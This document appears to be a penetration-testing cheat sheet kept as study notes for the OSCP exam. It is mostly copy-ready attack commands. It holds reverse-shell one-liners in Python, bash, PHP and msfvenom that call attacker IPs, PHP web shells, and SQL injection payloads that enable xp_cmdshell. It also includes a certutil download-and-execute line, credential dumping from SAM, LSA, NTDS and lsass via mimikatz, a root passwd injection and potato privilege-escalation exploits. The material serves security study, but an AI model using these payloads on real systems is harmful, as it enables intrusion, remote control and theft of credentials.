# 0xOSCPNotes
Enumeration, exploitation, and privilege escalation notes, all in one place.

## Table of Contents
- [Enumeration](#enumeration)
  - [Network Scanning](#network-scanning)
  - [Web Enumeration](#web-enumeration)
  - [Footprinting](#footprinting)
    - [FTP](#ftp)
    - [SMB](#smb)
    - [NFS](#nfs)
    - [SQL](#sql)
    - [SMTP](#SMTP)
- [Exploitation](#exploitation)
  - [Attacking Common Services](#attacking-common-services)
    - [Attacking SMB](#attacking-smb)
    - [Attacking SQL](#attacking-sql)
  - [Password Attacks](#password-attacks)
    - [Password Mutations](#password-mutations)
    - [Remote Attacks](#remote-attacks)
    - [Cracking Passwords](#cracking-passwords)
  - [Shells & Payloads](#shells-&-payloads)
    - [Interactive Shells TTY](#interactive-shells-tty)
    - [PHP Shells](#php-shells)
    - [Python Shells](#python-shells)
    - [Bash Shells](#bash-shells)
    - [msfvenom](#msfvenom)
- [Privilege Escalation](#privilege-escalation)
  - [Linux PE](#linux-pe)
  - [Windows PE](#windows-pe)
- [Arsenal](#arsenal)
  - [BURP](#burp)
  - [TMUX](#tmux)
  - [Python Virtual Environment](#python-virtual-enviroment)
  - [File Transfers](#file-transfers)
    - [Windows SMB](#windows-smb)


## Useful Sites
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [HackTricks](https://book.hacktricks.wiki/en/index.html)
- [PentestBook](https://pentestbook.six2dez.com/)
- [CPTS-CheatSheet](https://github.com/zagnox/CPTS-cheatsheet)


---

# Enumeration

### Network-Scanning
```bash
# nmap service scan
nmap -sCV -T4 -p- <IP> -oN test_scan.txt

# nmap udp scan
namp -sU <IP> --top-ports 100 --min-rate 5000 -oN test_scanudp.txt

# rustscan with nmap
rustscan -a <IP> -- -sV -sC -oN nmap_output.txt
```

## Web Enumeration

```bash
# FFUF directory scan
ffuf -w ~/Wordlists/SecLists/Discovery/xx:FUZZ -u http://<IP>:x/FUZZ

# FFUF SubDomain scan
ffuf -u http://<IP>.x -c -w ~/Wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H 'HOST: FUZZ.<IP>.x' -fs 0 

# FFUF vHost scan
ffuf -c -w ~/Wordlists/SubDFuzz/subdbig.txt:FUZZ -u http://FUZZ.x.x/

# Dirsearch directory scan
dirsearch -h http://<IP>/

# Nikto scan
nikto -h http://<IP>/

# Check the following for tech stack information
/proc/self/environ
```
## Footprinting
### FTP
```bash
# Connect to FTP
ftp <IP>

# Interact with a service on the target.
nc -nv <IP> <PORT>

# Download all available files on the target FTP server
wget -m --no-passive ftp://anonymous:anonymous@<IP>
```
### SMB
```bash
# Connect to SMB share
smbclient //<IP>/<share>

# List Shares
smbclient -L //<IP>//

# Interaction with the target using RPC
rpcclient -U "" <IP>

# Enumerating SMB shares using null session authentication.
crackmapexec smb <IP> --shares -u '' -p '' --shares

# Downloading everything with smbclient
recurse ON
prompt OFF
mget *
```
### NFS
```bash
# Show available NFS shares
showmount -e <IP>

# Mount the specific NFS share.umount ./target-NFS
mount -t nfs <FQDN/IP>:/<share> ./target-NFS/ -o nolock
```
### DNS
```bash
# NS request to the specific nameserver.
dig ns <domain.tld> @<nameserver>

# ANY request to the specific nameserver
dig any <domain.tld> @<nameserver>

# AXFR request to the specific nameserver.
dig axfr <domain.tld> @<nameserver>
```
### SQL
SQLI Injection commands
https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/Generic-SQLi.txt

Configuring xp_cmdshell from SQLi
```bash
admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+
admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+
admin'; exec master..xp_cmdshell 'powershell.exe -e JAdauih1u23h<SNIP>== '--
```

mysql (add end method if TSL/SSL error appears)
```bash
mysql -h <IP> -u <USER> -p --skip-ssl
```
mssql
```bash
impacket-mssqlclient <user>@<FQDN/IP> -windows-auth

# View databases
SELECT name FROM sys.databases

# View tables
SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES;

# Select from tables
SELECT * FROM dbo.backupset

# Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#this turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE

#this enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'

# SQLi through web URL for SMB hash connection. Listen with responder
http://<IP>/test?test=1; EXEC master ..xp_dirtree '\\10.10.15.237\test'; --

```
```bash
SHELL UPLOADER PHPMYADMIN
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE 'C:/wamp/www/uploader.php';
```

### SMTP
```bash
# Crafting a malicious ODT file reverse shell
python3 mmg-ods.py windows <ATTACKPORT> <ATTACKIP>

# Crafting a malicious ODT file to obtain NetNTLM Hash
python3 badodt.py

# Sending emails using Swaks
swaks --from getpwned@pwned.com --to career@job.local --header 'Subject: LhotseCV' --body 'Below is my attached CV' -attach @file.txt --server <IP>
```

# Exploitation
## Attacking Common Services
### Attacking SMB
```bash
# Network share enumeration using smbmap.
smbmap -H <IP>

# Null-session with the rpcclient.
rpcclient -U'%' <IP>

# Execute a command over the SMB service using crackmapexec.
crackmapexec smb <IP> -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

# Extract hashes from the SAM database.
crackmapexec smb <IP> -u administrator -p 'Password123!' --sam

# Dump the SAM database using impacket-ntlmrelayx.
impacket-ntlmrelayx --no-http-server -smb2support -t <IP>
```
### Attacking SQL
```bash
# SQL xp_cmdshell
EXECUTE sp_configure 'show advanced options', 1
EXECUTE sp_configure 'xp_cmdshell', 1
RECONFIGURE
xp_cmdshell 'whoami'
```
## Password Attacks
### Password Mutations
```bash
# cewl to generate a wordlist based on keywords present on a website.
cewl https://<IP>/ -d 4 -m 6 --lowercase -w TARGET.wordlist

# cewl to generate a wordlist minimum 5 words with depth of 5
cewl -d 5 -m 3 http://<IP>/ > TARGET.txt

# Hashcat to generate a rule-based word list.
hashcat --force password.list -r custom.rule --stdout > mut_password.list

# Uses username-anarchy with a pre-made list of first and last names to generate a list of potential username.
./username-anarchy -i /path/to/listoffirstandlastnames.txt
```
### Remote Attacks
```bash
# Hydra in conjunction with a user list and password list to attempt to crack a password over the specified service.
hydra -L user.list -P password.list <service>://<ip>

# CrackMapExec in conjunction with admin credentials to dump password hashes stored in SAM, over the network.
crackmapexec smb <IP> --local-auth -u <username> -p <password> --sam

# CrackMapExec with admin credentials to dump lsa secrets, over the network.
crackmapexec smb <IP> --local-auth -u <username> -p <password> --lsa

# CrackMapExec with admin credentials to dump hashes from the ntds file over a network.
crackmapexec smb <IP> -u <username> -p <password> --ntds

# Hydra to inject a login attack on a HTML http-post-form
hydra -l admin -P 2023-200_most_used_passwords.txt -f <IP> -s 80 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid username or pass"

# Custom password policy
crackmapexec smb <IP> -u avazquez -p Password123 --pass-pol

# WPScan WordPress password attack using xmlrpc
sudo wpscan --password-attack xmlrpc -t 20 -U <USER> -P ~/Wordlists/rockyou.txt --url http://<IP>/
sudo wpscan --url http://192.168.163.239/ -e u -P ~/Wordlists/Passwords/rockyou.txt
```
### Cracking Passwords
```bash
# Hashcat to crack a given hash
hashcat -m 1000 <HASH> /usr/share/wordlists/rockyou.txt

# John to crack a given hash
john --wordlist=rockyou.txt pdf.hash --show

# unshadow to combine data from passwd.bak and shadow.bk into one single file to prepare for cracking.
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

# Hashcat to crack the unshadowed hashes and outputs to a file called unshadowed.cracked.
hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked

# <service>2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
office2john Protected.docx > protected-docx.hash
keepass2john Protected.kdbx > protected-kdbx.hash
bitlocker2john Protected.raw > protected-bl.hash
zip2john Protected.zip > protected-zip.hash
pdf2john Protected.pdf > protected-pdf.hash
``` 
## Shells & Payloads
- [RevShell-CheatSheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
### Interactive Shells TTY
```bash
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

(crtl + z)
stty raw -echo && fg
export TERM=xterm

# Invoke a shell from established shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### PHP Shells
```php
# Simple Web Shell
<?php system($_GET['cmd']); ?>

<?php system($_REQUEST['cmd']); ?>

<?php system('nc <IP> <PORT> -e /bin/bash')?>

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.225/445 0>&1'");?>

echo "<?php system('bash -pi'); ?>" > /var/backups/database-backup.php

```
### Python Shells
```bash
# Python Rev Shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.45.241\",445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"
```
### Bash Shells
```bash
# Bash Rev Shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

# Wrapped Bash Shell
bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"

# Busybox
busybox nc <IP> <PORT> -e sh

```
### Windows Shells
Added to the bottom of nishangs Invoke-PowerShellTcp.ps1 file
```bash
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.52 -Port 1337
```
Crafting a .exe using msfvenom avoiding bad potential bad characters
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.199 LPORT=443 -b '\x00\x01\x0d' -f exe -o revshell.exe
```
Using Certutil to upload and execute files
```bash
certutil.exe -f -urlcache -split http://192.168.45.199:8000/revshell.exe c:\windows\temp\revshell.exe && cmd.exe /c c:\windows\temp\revshell.exe
```
### msfvenom
```bash
# List payloads
msfvenom -l payloads

# Stageless payload
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=1337 -f elf > createbackup.elf

# Windows payload
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > Revenue.exe
```
# Privilege Escalation
## Linux PE
- [GTFOBins](https://gtfobins.github.io/)
- [pspy](https://www.kali.org/tools/pspy/)
- [linpeas](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS)
- [enum4linux](https://www.kali.org/tools/enum4linux/)
### Linux Search 
```bash
# List directories like tree /F /A
ls -la -R

# Search for file types
find . -type f -iname '*db*' -print

# Searching for Username in files
grep -Ri 'USER' .

# Search for writable files
find / -writable -type d 2>/dev/null

# Search for SUID
find / -perm -u=s -type f 2>/dev/null

# Search for Capabilities
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;

# Search for User specific executables and files
find / -user USER -perm -u=wrx 2>/dev/null

# Search for running processes as root
ps auxww | grep root

# Check for Permissions
ls -l /

# Creating a superuser
echo 'superroot:sXuCKi7k3Xh/s:0:0::/root:/bin/bash' > fkpasswd

```
### Docker Group
```bash
# Check group and if docker.sock is root owned
etent group docker
docker:x:115:selena

ls -l /var/run/docker.sock
srw-rw---- 1 root docker 0 Mar  1  2025 /var/run/docker.sock

# Spawn an interactive shell as root
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
## Windows PE
### Privileges
```bash
# List passwords in credential manager
cmdkey /list

# Search for string in
findstr /SIM /C:"pass" *.ini *.cfg *.config *.xml
```
```bash
# Lists user privileges
whoami /priv

# Lists user groups
whoami /groups

# Check Scheduled Tasks
wmic process get Name,ProcessId,CreationDate

# Quick PowerShell upload transgfer
powershell iwr 10.10.16.52/nothinghere.aspx -outfile "C:\inetpub\wwwroot\nothinghere.aspx"

# Enumeration with PowerUp.ps1
C:\Users\Public>powershell -command "& { . .\PowerUp.ps1; Invoke-AllChecks | Out-File -Encoding ASCII powerup_output.txt }"

# SeImpersonate and SeAssignPrimaryToken
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe <YOUR_IP> <PORT> -e cmd.exe" -t *
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe <YOUR_IP> <PORT> -e cmd"

# If CLSID is required
reg query HKCR\CLSID /s /f LocalService

HKEY_CLASSES_ROOT\CLSID\{8BC3F05E-D86B-11D0-A075-00C04FB68820}
    LocalService    REG_SZ    winmgmt

HKEY_CLASSES_ROOT\CLSID\{C49E32C6-BC8B-11d2-85D4-00105A1F8304}
    LocalService    REG_SZ    winmgmt

.\juicypotato.exe -l 1337 -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}" -p c:\windows\system32\cmd.exe -a " /c c:\windows\temp\nc.exe -e cmd.exe 10.10.16.2 1337" -t *

# Always Install Elevated
PS C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


# SeDebugPrivilege
procdump.exe -accepteula -ma lsass.exe lsass.dmp

mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# SeTakeOwnershipPrivilege
Import-Module .\Enable-Privilege.ps1
PS C:\htb> .\EnableAllTokenPrivs.ps1

# Choosing a taget
Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}

# Checking Ouwnership and taking ownership of file
cmd /c dir /q 'C:\Department Shares\Private\IT'

takeown /f 'C:\Department Shares\Private\IT\cred.txt'

# Modifying ACL if needed
icacls 'C:\Department Shares\Private\IT\cred.txt' /grant htb-student:F
```
Don't forget to use SysinternalsSuite

### Windows Subsystem Enumeration
```bash
Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %{Get-ItemProperty $_.PSPath} | out-string -width 4096
```


# Arsenal
## BURP
```bash
# Fixing burp certificates
Visit http://burp using pwnfox and select CA Certificate in the top right.
Once downloaded head to FireFox settings and search Certificates and import it.

# BLOODHOUND CLASH
netstat -lntp | grep 8080
sudo kill <ID>
```

## TMUX
```bash
Adding executables to PATH
echo 'export PATH=$PATH:/usr/share/doc/python3-impacket/examples' >> ~/.zshrc
source ~/.zshrc 
```
```bash

# Cleaner name format
crlt + alt + p

# Start a new tmux session
tmux new -s <name>

# Start a new session or attach to an existing session named mysession
tmux new-session -A -s <name>

# List all sessions
tmux ls

# kill/delete session
tmux kill-session -t <name>

# kill all sessions but current
tmux kill-session -a

# attach to last session
tmux a
tmux a -t <name>

# start/stop logging with tmux logger
prefix + [Shift + P]

# split tmux pane vertically
prefix + [Shift + %}

# split tmux pane horizontally
prefix + [Shift + "]

# switch between tmux panes
prefix + [Shift + O]
```
## Python Virtual Environment
```bash
python3 -m venv /.venv

source venv/bin/activate

deactivate
```
Using python2 to install packages. Get pip2
```bash
curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py
```

## File Transfers
### Windows SMB
```bash
# Setup the malicious share
sudo python3 smbserver.py share -smb2support /tmp/smbshare -username test -password test

# Connection over Windows host
C:\htb> net use n: \\192.168.220.133\share /user:test test
